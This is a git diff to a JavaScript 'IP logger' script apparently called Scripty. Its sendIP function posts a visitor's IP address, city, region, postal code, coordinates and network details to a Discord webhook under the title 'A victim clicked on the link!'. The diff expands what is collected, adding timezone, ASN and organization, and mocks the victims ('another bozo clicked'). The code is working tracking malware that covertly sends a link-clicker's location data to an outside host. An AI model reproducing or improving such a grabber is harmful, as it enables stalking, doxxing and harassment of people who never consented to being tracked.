@@ -13,13 +13,13 @@ const sendIP = () => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "Scripty is best :)",
+                            username: "SCRIPTY IP LOGGER",
                             avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png?ex=68a6cd21&is=68a57ba1&hm=4cd65810547baf7fc0a1f806e3df638663c3c6242b30dbb5003b57e0e000a554&=&format=webp&quality=lossless", // optionally changeable
-                            content: `@here`,
+                            content: `@here another bozo clicked`,
                             embeds: [
                                 {
                                     title: 'A victim clicked on the link!',
-                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}\n**Timezone >> ** ${geoData.timezone}\n**ASN >> ** ${geoData.asn}\n**Organization >> ** ${geoData.org}`,
                                     color: 0x800080
                                 }
                             ]
